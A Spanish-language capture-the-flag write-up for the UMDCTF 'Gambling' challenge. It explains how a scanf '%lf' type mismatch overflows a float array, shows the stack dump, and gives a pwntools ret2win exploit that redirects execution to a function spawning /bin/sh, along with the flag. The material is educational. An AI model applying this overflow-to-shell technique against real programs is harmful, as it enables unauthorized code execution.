# Gambling

## Analisis

Codigo fuente:
``` C
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

float rand_float() {
  return (float)rand() / RAND_MAX;
}

void print_money() {
	system("/bin/sh");
}

void gamble() {
	float f[4];
	float target = rand_float();
	printf("Enter your lucky numbers: ");
	scanf(" %lf %lf %lf %lf %lf %lf %lf", f,f+1,f+2,f+3,f+4,f+5,f+6);
	if (f[0] == target || f[1] == target || f[2] == target || f[3] == target || f[4] == target || f[5] == target || f[6] == target) {
		printf("You win!\n");
		// due to economic concerns, we're no longer allowed to give out prizes.
		// print_money();
	} else {
		printf("Aww dang it!\n");
	}
}

int main(void) {
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stdin, NULL, _IONBF, 0);

	char buf[20];
	srand(420);
	while (1) {
		gamble();
		getc(stdin); // consume newline
		printf("Try again? ");
		fgets(buf, 20, stdin);
		if (strcmp(buf, "no.\n") == 0) {
			break;
		}
	}
}
```

Nos dan un ELF de 32 bits que nos permite entrar 7 "numeros de la suerte"

La "logica de victoria" no nos lleva a nada pero notamos que los flotantes son almacenados en el array `f` de solo 4 elementos, pero podemos introducir hasta 7 elementos. Si probamos el binario varias veces nos percatamos de que introducir un numero valido en el 7mo elemento provoca un buffer overflow.

Esto es otro ret2win, esta vez contamos con `print_money` para invocar una shell. Debemos redirigir el flujo del programa a esta funcion.

Chequeamos las propiedades del binario:
```
[*] '/home/kalcast/Descargas/Gambling/gambling'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    FORTIFY:    Enabled
    Stripped:   No

```

No tiene `PIE` asi que las direcciones del binario son fijas y no tiene `canary` asi que podemos sobreescribir las direcciones de retorno sin preocuparnos.

#### Explotacion

A pesar de que si se mira el stack parece que con los 7 numeros que introducimos no basta para llegar a la direccion de retorno de la funcion en realidad si ocurre:

```
Enter your lucky numbers: 32.1
32.1
32.1
32.1
32.1
32.1
n
```

```
[0x08049336]> pxW @ esp
0xffd531e0 0x0804a02b str.__lf__lf__lf__lf__lf__lf__lf
0xffd531e4 0xffd53220 esp+64
0xffd531e8 0xffd53224 esp+68
0xffd531ec 0xffd53228 esp+72
0xffd531f0 0xffd5322c esp+76
0xffd531f4 0xffd53230 esp+80
0xffd531f8 0xffd53234 esp+84
0xffd531fc 0xffd53238 esp+88
0xffd53200 0x00000001 section.+1
0xffd53204 0x0804a010 str.Enter_your_lucky_numbers:
0xffd53208 0xffd5324c ebx
0xffd5320c 0x080492e8 sym.gamble+8
0xffd53210 0x000001a4 elf_phdr+368
0xffd53214 0xf7f02448 fcn.f7f01900+2888
0xffd53218 0xf7f038ec fcn.f7f031c0+1836
0xffd5321c 0x3b1cbd98
0xffd53220 0xcccccccd                     # Primer parametro
0xffd53224 0xcccccccd
0xffd53228 0xcccccccd
0xffd5322c 0xcccccccd
0xffd53230 0xcccccccd
0xffd53234 0xcccccccd
0xffd53238 0x40400ccc                     # Septimo parametro que supuestamente causa overflow
0xffd5323c 0x08049135 main+85
```


Como se observa queda justo antes del retorno pero la magia esta en como `scanf` consume los numeros:
`scanf(" %lf %lf %lf %lf %lf %lf %lf", f,f+1,f+2,f+3,f+4,f+5,f+6);`

Normalment para consumir un `float` se usa `%f`, aqui usan `%lf`, esto hace que el `float` se extienda a `double` en memoria antes de almacenarse; o sea , normalmente un `float` ocupa 4 bytes en arquitecturas de 32-bits pero como se extiende a `double` se crean 4 bytes mas significativos que corrompen los bytes adyacentes (mas altos en memoria), por lo que el 7mo parametro corrompe la direccion de retorno a main+85.

Sabiendo eso tenemos que hacer dos cosas:
1. Extender nuestra direccion de `print_money` con 4 bytes mas para que ocupe el tamano completo de un double y en los bits menos significativos caiga la direccion de memoria.
2. Convertir nuestros bytes a un float para que lo acepte la entrada usando el estandar `IEEE-754`

Exploit:
```python
from pwn import *

#p = process('./gambling')
p = remote("challs.umdctf.io",31005)
elf = context.binary = ELF("./gambling")

#gdb.attach(p,gdbscript="""
#            break *0x08049331
#            break  *0x08049393
#           """)
context.log_level = "debug"

money = 0x080492c0
# double
magic = struct.unpack('d', b'\x00\x00\x00\x00' + p32(money))[0]

payload = [
    b'2.1',
    b'2.2',
    b'3.3',
    b'4.4',
    b'5.5',
    b'0.0',
    str(magic).encode(),
]

print(f"{magic}")
print(f"{struct.pack("f",magic)}")
print(payload)
p.sendlineafter(b"Enter your lucky numbers: ", b' '.join(payload))
p.interactive()
```

`UMDCTF{99_percent_of_pwners_quit_before_they_get_a_shell_congrats_on_being_the_1_percent}`
